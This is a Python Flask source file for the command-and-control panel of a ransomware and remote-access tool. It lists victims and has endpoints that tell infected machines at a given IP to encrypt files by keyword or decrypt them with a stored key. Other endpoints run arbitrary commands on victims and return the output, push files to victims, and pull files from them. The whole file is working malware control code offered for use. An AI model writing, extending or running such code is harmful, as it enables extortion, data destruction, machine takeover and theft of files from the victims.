from flask import Flask, render_template, request, redirect, url_for
import Database, Server

app = Flask(__name__, template_folder="templates", static_folder="staticfiles")

@app.route("/")
def home():
    victims = Database.get_victims()
    return render_template("index.html", victims = victims)

@app.route('/ransomware/encrypt', methods=['POST'])
def enc_api():
    ip = request.form.get('ip') 
    keywords = request.form.get('keywords')
    msg = "ransomware;encrypt?keywords=" + keywords

    Server.send_msg(ip, msg)

    response = {
        "msg": "Encryption is started."
    }
    return response

@app.route('/ransomware/decrypt', methods=['POST'])
def dec_api():
    ip = request.form.get('ip')
    mac = Database.get_victim_by_ip(ip)
    dec_key = Database.get_key(mac)
    if dec_key == False:
       print("Encryption is not done before!")
    else:
        msg = "ransomware;decrypt?decryptionKey=" + dec_key
        Server.send_msg(ip, msg)

    response = {
        "msg": "Decryption is started."
    }    
    return response

@app.route('/command', methods=['POST'])
def cmd_api():
    ip = request.form.get('ip') 
    command = request.form.get('command') 
    msg = "command;execute?cmd=" + command

    Server.send_msg(ip, msg)

    mac = Database.get_victim_by_ip(ip)
    cmdHistory = Database.get_victim(mac)["commands"]
    response = "Error"
    for pair in cmdHistory:
        if pair[0] == command:
            response = pair[1]
            break


    response = {
        "msg": response
    }
    return response

@app.route('/file/send', methods=['POST'])
def fsend_api():
    ip = request.form.get('ip') 
    filePath = request.form.get('filePath') 
    #msg = "fileTransfer;save?path" + filePath
    Server.send_file(ip, filePath)
    #TODO Server.send_msg çağırılacak

    response = {
        "msg": "File is sent."
    }
    return response

@app.route('/file/recv', methods=['POST'])
def frecv_api():
    ip = request.form.get('ip') 
    filePath = request.form.get('filePath') 
    msg = "fileTransfer;sendFile?path=" + filePath
    
    Server.send_msg(ip, msg)

    response = {
        "msg": "File is requested."
    }
    return response

if __name__ == "__main__":
    app.run(debug=True)
